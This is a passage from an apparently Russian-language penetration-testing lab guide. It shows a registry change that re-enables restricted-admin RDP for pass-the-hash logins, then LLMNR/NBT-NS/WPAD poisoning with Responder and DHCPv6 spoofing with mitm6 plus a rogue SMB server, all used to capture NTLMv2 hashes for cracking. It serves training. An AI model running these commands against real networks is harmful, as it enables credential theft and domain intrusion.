id="0f3a97b7-80c2-443a-a1ee-e46f68f3ea20"/><figure id="7fe26bed-7906-44d3-b6e7-69944ba1b48b" class="image"><a href="https://i.imgur.com/DphHyj6.png"><img src="https://i.imgur.com/DphHyj6.png"/></a></figure><hr id="cbd857f3-e955-4178-9a2e-2caba9cf4ce8"/><p id="1ceaddbc-90f2-4c4d-b87d-f0de8c0a593b" class="">подтвердим сертификат</p><hr id="7e9cce1e-6c48-4afb-b5ed-64de6077326d"/><figure id="b4e60908-c6c1-4273-8918-e649faa0cf32" class="image"><a href="https://i.imgur.com/vN9Uyls.png"><img src="https://i.imgur.com/vN9Uyls.png"/></a></figure><hr id="e5ca0066-3186-4103-9973-1fedec0ce5ef"/><figure id="e278c5fa-9116-4dee-b5c2-7b3a742846e2" class="image"><a href="https://i.imgur.com/vMbwoPa.png"><img src="https://i.imgur.com/vMbwoPa.png"/></a></figure><hr id="29fdb393-2bad-498b-b27b-0fefb7a4b0f2"/><p id="256caa16-1fec-4b25-b497-925845c061fc" class="">Действует политика restricted admin</p><p id="b3131167-1f0a-4192-8dce-ff1219e4e7d6" class="">Изменим параметр реестра на dc1</p><hr id="6de00876-8a71-4c1f-85d9-3067e4da6815"/><figure id="127c494a-a91b-491f-a8b3-e429dd130f05" class="image"><a href="https://i.imgur.com/ziyJBvE.png"><img src="https://i.imgur.com/ziyJBvE.png"/></a></figure><hr id="06cdb265-2858-4457-a1e1-c9953964803e"/><p id="c7747ea4-d96e-4179-9e84-1d9f82cc3ed3" class="">Использованная команда: </p><blockquote id="cd0faf9e-dd4c-498a-9039-5be618942728" class="">New-ItemProperty -Path “HKLM:\System\CurrentControlSet\control\Lsa” -Name “DisableRestrictedAdmin” -Value “0” -PropertyType DWORD -Force</blockquote><hr id="4ff327e1-40ff-4222-b23f-1509b1ffb49b"/><p id="130b519b-252b-4e24-8065-2390ae5ab218" class="">Кстати, ведь у нас включена политика аудита PoSH -- там можно увидеть выполнение этой команды</p><hr id="fe7f1990-af46-4ce7-8c32-d561e74f62be"/><figure id="750a69c9-6e20-4bf3-9ce4-3cb604982b12" class="image"><a href="https://i.imgur.com/UEHVZ0o.png"><img src="https://i.imgur.com/UEHVZ0o.png"/></a></figure><hr id="e49e748e-b85b-4a0e-994a-ed16dabe9836"/><p id="2f0462e3-0980-48e2-8aac-30d87d225d79" class="">После чего xfreerdp спокойно пускает нас с помощью хеша</p><hr id="1f954a74-b2c9-41ca-920b-951284141f8b"/><figure id="b18adebe-a276-4411-a412-1228137d32d7" class="image"><a href="https://i.imgur.com/UTlRDQx.png"><img src="https://i.imgur.com/UTlRDQx.png"/></a></figure><hr id="c4e9b29c-b9de-43dc-b1e4-f574fb1f7b8b"/><h3 id="c1149f42-f5ed-43a7-b5a2-5bfce3fa6b9d" class="">Этап 3. Атаки на базовые протоколы Windows</h3><p id="52bb65f1-f1d1-46c2-b42c-a67bed38854e" class=""><em>Для выполнения данной части практики необходимы виртуальные машины Kali linux, pc1 и DC1.</em></p><h3 id="ae12c0a5-b9b3-42fd-b889-5746c9d5fcc6" class="">NBT-NS &amp; LLMNR &amp; mDNS</h3><p id="bec8cf7f-721d-4af9-bcab-a87ce2308db6" class="">Важной частью эксплуатации будет WPAD -- специальный протокол для настройки проксирования в системе Win. Система всегда запрашивает файл с настройками wpad.dat, а злоумышленник может подсунуть свой файл, став прокси-серверов для Win и таким образом осуществив атаку &quot;человек посередине&quot;.<br/><br/><a href="https://en.wikipedia.org/wiki/NetBIOS_over_TCP/IP">NBT-NS</a> (NetBIOS Name Service) -- протокол, позволяющий компьютерам в локальной сети обращаться друг к другу по именам, не используя сервер DNS.<br/><br/><a href="https://ru.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution">LLMNR</a> (Link-Local Multicast Name Resolution) -- протокол для поиска и преобразования базовых имен внутри небольшой сети. Он же -- сетевое обнаружение. Использует мультикаст (то есть почти как широковещательный трафик, его в сети смогут увидеть все).<br/><br/><a href="https://en.wikipedia.org/wiki/Multicast_DNS">mDNS</a> (Multicast DNS) -- суть такая же, как и у LLMNR. DNS через Мультикаст.<br/>Все вместе технологии реализуют <br/><a href="https://ru.wikipedia.org/wiki/Zeroconf">Zeroconf.</a><br/>Основная уязвимость в этих протоколах -- отсутствие подтверждения информации. Мы можем сгенерировать любой ответ на запрос ПК по этим протоколам.<br/></p><blockquote id="edea5d77-2821-4ba1-8e91-86f2d5bbff6f" class="">Например, пользователь PC1 вводит в &quot;проводник&quot; сетевой путь &quot;\\\computer-1&quot;. Если PC1 не знает ничего про этой имя и DNS сервер тоже не может ответить, то тогда PC1 спрашивает всю локальную сеть следующее: &quot;кто нибудь в курсе, кто таков &quot;computer-1&quot; и какой у него IP?&quot; Если мы ответим PC1 и скажем, что наш адрес -- это адрес &quot;computer-1&quot;, то PC1 нам поверит. По итогу получим атаку вида MITM. Для того, чтобы автоматически отвечать на такие запросы, есть инструмент Responder.<br/>Атака не пройдёт, если реальный DNS сервер сможет ответить на DNS запрос компьютера.<br/></blockquote><p id="22527c05-00e0-4eaa-8f35-8822c680db6d" class="">Начать всегда стоит со справки, чтобы изучить флаги скрипта и его возможности:</p><blockquote id="f02bb6c0-78cd-444d-9d94-8d4e69c879cc" class="">responder -h</blockquote><h3 id="21644135-41ad-4e76-a0ca-a5a17d77e66a" class="">Анализ инфраструктуры через responder</h3><p id="12b20264-4e65-408f-a941-91bb2578b7d8" class="">Запускаем анализ Responder</p><hr id="46e23f9d-39d4-4f93-b0b2-aa573139da8d"/><figure id="ede2af00-284c-432a-b915-26891035774e" class="image"><a href="https://i.imgur.com/guCJuzF.png"><img src="https://i.imgur.com/guCJuzF.png"/></a></figure><hr id="82486bbd-210b-4eac-82c8-735113b97332"/><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="89b49526-ca56-496e-a87d-7584e4d7d922" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">responder -I eth0 -A</code></pre><hr id="55acdef7-63e8-4d22-9636-2aba55c3c6d2"/><p id="bcc2cade-3af1-4e3f-9b02-aaf8a07952a0" class="">Доменный ПК пытается обратиться к несуществующему сетевому ресурсу</p><hr id="8467e86c-5398-44bd-8049-9e75508f0182"/><figure id="a7206ad5-a73e-402a-9600-b33e0497a10e" class="image"><a href="https://i.imgur.com/1PKiKwc.png"><img src="https://i.imgur.com/1PKiKwc.png"/></a></figure><hr id="82319234-35c5-41b9-ad13-33d68398efdb"/><p id="cafdabc7-5bda-40be-a28e-5563ce6c956a" class="">Например, пользователь попытался пройти по сетевому пути и допустил опечатку. Либо же ссылка в письме, ведущая на файловую шару, оказалась чуть-чуть некорректная</p><hr id="675d0f17-70e1-4bda-b375-174380fb2967"/><p id="448181f8-4685-4a28-88bd-d9590503755b" class="">Анализатор видит LLNMR, NBNS запросы</p><hr id="b23a38d5-e78e-4ca7-910e-1e0331905e6b"/><figure id="3595ded4-e4d5-4bde-abea-c1b16de28907" class="image"><a href="https://i.imgur.com/J0pkT8m.png"><img src="https://i.imgur.com/J0pkT8m.png"/></a></figure><hr id="d779480f-b53e-4f23-8b41-d57ca00fc8f4"/><hr id="cca6d619-2372-42f6-88f3-6ff6c8c1b50e"/><h3 id="7b6fa6dd-46e5-4342-8452-46ca9565abd3" class="">Режим атаки:</h3><blockquote id="dc9cfa90-0d7e-4ee5-9602-2d6c40206249" class="">responder -I eth0 -wFv<ul id="e2608192-e1b5-4672-b801-2d44fee418b1" class="bulleted-list"><li style="list-style-type:disc">где -I eth0 -- выбор интерфейса,</li></ul><ul id="e4d9b2c6-fcbd-4227-87bc-172f4d12ea5e" class="bulleted-list"><li style="list-style-type:disc">w -- отравление WPAD,</li></ul><ul id="097616b0-9bc1-4629-9392-783eccdb9efe" class="bulleted-list"><li style="list-style-type:disc">F -- попробовать принудить систему использовать старые протоколы аутентификации, если возможно,</li></ul><ul id="3a5d0ba8-9fa7-4b86-87a9-f63638936e7a" class="bulleted-list"><li style="list-style-type:disc">v -- вывод подробной информации (в т.ч. перехваченного хэша).</li></ul></blockquote><p id="92610c57-b132-4e2f-aebf-4c90a5b4927e" class="">Responder запускается</p><hr id="85d14ca9-ab72-4ad0-a12a-e70408ae1633"/><figure id="a251319c-ef19-4b11-95ec-d18c4bcb9bbc" class="image"><a href="https://i.imgur.com/6srCEsz.png"><img src="https://i.imgur.com/6srCEsz.png"/></a></figure><hr id="2704734b-a585-4190-b2c0-d210a3cd29e7"/><p id="9b6f08c0-814e-41ce-bb33-3e9d40ea667f" class="">Пользователь снова проходит по несуществующему пути</p><hr id="2b5f404d-8dca-47cb-9f08-4196292eab2d"/><figure id="5c5e3a1a-e9a9-4ec9-84d4-fbda5b398a46" class="image"><a href="https://i.imgur.com/m8lgY4E.png"><img src="https://i.imgur.com/m8lgY4E.png"/></a></figure><hr id="b088a64e-b84c-4c9f-8860-8056970d3502"/><p id="94544314-0b46-4325-893d-329331f02753" class="">Responder притворяется этим ресурсом, поэтому видим окно аутентификации</p><hr id="0efbbdd2-7f0f-4ab3-a4ed-31421eae6fe9"/><p id="a019fa40-c3b3-4975-9255-cfe462071a36" class="">Responder перехватывает аутентификационный токен</p><hr id="7362a7a3-2210-46db-a2b6-6059d2a8f366"/><figure id="5f16d911-6133-458b-904a-76e7c2885565" class="image"><a href="https://i.imgur.com/FF9JefQ.png"><img src="https://i.imgur.com/FF9JefQ.png"/></a></figure><hr id="2db7000d-92a5-496a-9478-458899a74642"/><figure id="08b7e306-b3c2-47e7-8cc9-589c049310b2" class="image"><a href="https://i.imgur.com/xyA0bVW.png"><img src="https://i.imgur.com/xyA0bVW.png"/></a></figure><hr id="14b20517-7811-4eff-a223-22ee63194311"/><p id="fdef0694-5946-48e2-a72e-1f29c51ed60f" class="">Данный токен можно подвергнуть брутфорсу.</p><hr id="c30d76ec-29e5-4888-ad19-04cb42713f8f"/><p id="a6ca9663-80e0-47f5-806f-171b83b2d9c3" class="">При попытке пользователя обратиться к несуществующему в DNS WinServer16 ресурсу (в этом примере это &quot;\\\somebodywastoldme&quot;) в выводе мы увидим NTLNv2 аутентификацию, которую после можно брутфорсить через hashcat или John the ripper. В выводе будет NTLMv2 хэш, так как наш сервер не принимает kerberos аутентификацию, вынуждая win10 аутентифицироваться по чистому NTLMv2.</p><hr id="307119a7-851c-4da5-9ffb-721d914dde14"/><h3 id="04d0644f-9df2-4498-a5b3-434cf3f7635e" class="">mitm6</h3><p id="db937bf2-302a-4844-b469-2a5a4f5704a6" class="">Атака имитирует DHCPv6 сервер и отправляет на компьютеры в сети параметры IPv6, которые используются в приоритете над IPv4 при отправке компьютеров данных по сети.</p><p id="12714c48-5149-4f75-99a3-abd93463ead8" class="">Установить можно как скачав с гитхаба, так и выполнив следующую команду:</p><blockquote id="b48696af-6cc9-4292-af66-101c348b7b59" class="">pip install mitm6<figure id="2f3c9b0c-1c54-491d-bc1b-e4ae7bd2fdb7" class="image"><a href="https://i.imgur.com/55PuDRz.png"><img src="https://i.imgur.com/55PuDRz.png"/></a></figure></blockquote><h3 id="02efd65e-9bc6-440f-b99a-6d5adb99f337" class="">Выполнение атаки:</h3><blockquote id="18245002-11c4-4ef9-85b1-e53d06558f00" class="">mitm6.py -d pt.local<ul id="b8aa37e2-4477-40f8-94ff-cabe04430d83" class="bulleted-list"><li style="list-style-type:disc">необходимо указывать атакуемый домен</li></ul></blockquote><p id="788c7aaf-c398-471a-a774-f2dd58e41f80" class="">Настройки сетевого адаптера pc1. Было:</p><hr id="37b69bb7-8a84-45e4-9bcb-1efbb69495b2"/><figure id="f5409f43-ee41-4806-8e92-c0fbfbab961f" class="image"><a href="https://i.imgur.com/yfraR4f.png"><img src="https://i.imgur.com/yfraR4f.png"/></a></figure><hr id="2ec70aac-a577-4f16-81c4-ea06c18ed8a0"/><p id="0d9acb6f-4b25-4e88-9c85-9243f0f5d43d" class="">Kali Linux. Атака</p><hr id="49cf1cde-90ab-409d-8187-bb729393c7bc"/><figure id="104d89aa-4cce-4534-a4f5-2c17c81e1151" class="image"><a href="https://i.imgur.com/QHHWRMy.png"><img src="https://i.imgur.com/QHHWRMy.png"/></a></figure><hr id="16789d5f-497d-479f-be09-a6aca7256600"/><p id="63480538-3d64-40d6-89ba-5b6958819b16" class="">Настройки сетевого адаптера pc1. Стало:</p><hr id="08c90240-7a71-4073-afc5-78d48615982c"/><figure id="d78b0bfc-11ad-4c6c-b49d-b02d7e48e91e" class="image"><a href="https://i.imgur.com/uvBZHmT.png"><img src="https://i.imgur.com/uvBZHmT.png"/></a></figure><hr id="8782b65f-8d6f-49e9-8f6d-9dd3c78d43d3"/><p id="e168db27-213b-45d9-b295-0e9d10ec613d" class="">Пока что мы только подменили параметры у win10, обеспечив mitm. Чтобы атака прошла незаметно для пользователя, нужно воспользоваться способом, который позволит нам прикинуться ресурсом, который требует аутентификацию. Воспользуемся SMB.</p><p id="a1ee9b85-aa7e-42ae-b23d-7419e5220034" class="">Создание своего сервера SMB. Не отключая mitm6, создадим SMB сервер:</p><blockquote id="799dee4e-e4ea-4f50-947e-bdc41bcdb1bd" class="">python3<p id="21023f7b-1d9b-4417-a484-edd87afff07f" class=""><a href="http://smbserver.py/">smbserver.py</a></p><figure id="aedaa8c2-e8a4-4fe4-95c2-8acac018cb32" class="image"><a href="https://i.imgur.com/slAQEXs.png"><img src="https://i.imgur.com/slAQEXs.png"/></a></figure></blockquote><p id="15857a19-8a3d-4cca-8529-cbb1f8f47dc6" class="">А на Win10 через проводник попробуем зайти на наш домен</p><hr id="2eff1373-cdfb-429b-813f-13d2daa5b41f"/><figure id="f5edbc31-de78-4127-9e39-4050d71c15d2" class="image"><a href="https://i.imgur.com/qKSIisA.png"><img src="https://i.imgur.com/qKSIisA.png"/></a></figure><hr id="a45d9a47-65de-44c1-a191-767ec5df67af"/><p id="eccfeaf4-e759-46dc-b8aa-16521e581f9d" class="">Увидим данные аутентификации в выводе программы</p><hr id="cb4079bd-a1f9-44af-92eb-8a1bdf5c5326"/><figure id="296669f8-da35-41ec-a3f5-cb2f5f2b9b09" class="image"><a href="https://i.imgur.com/NVn7VFP.png"><img src="https://i.imgur.com/NVn7VFP.png"/></a></figure><hr id="7906ef32-88a3-4f91-900c-bedc5ec8dd1b"/><p id="cc59abe0-ce49-49ff-8eef-b5ff93e826ae" class="">Эти аутентификационные данные уже можно вскрывать с помощью hashcat или John the ripper. Это не чистый хэш пароля, а аутентификация по протоколу NTLMv2</p><h2 id="a28cd2a1-84d9-4d79-865d-e9acc3ac749c" class="">Ссылки для закрепления материала и самостоятельного изучения:</h2><ul id="b248a12b-1090-4a61-8026-9a3684d691bd" class="bulleted-list"><li style="list-style-type:disc"><a href="https://www.securitylab.ru/analytics/480589.php">Уязвимости LLMNR</a></li></ul><ul id="fcc196df-7a58-4535-82d7-cfdbd7671ead" class="bulleted-list"><li style="list-style-type:disc"><a href="https://habr.com/ru/company/jetinfosystems/blog/449278/">Атаки на домен</a></li></ul></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
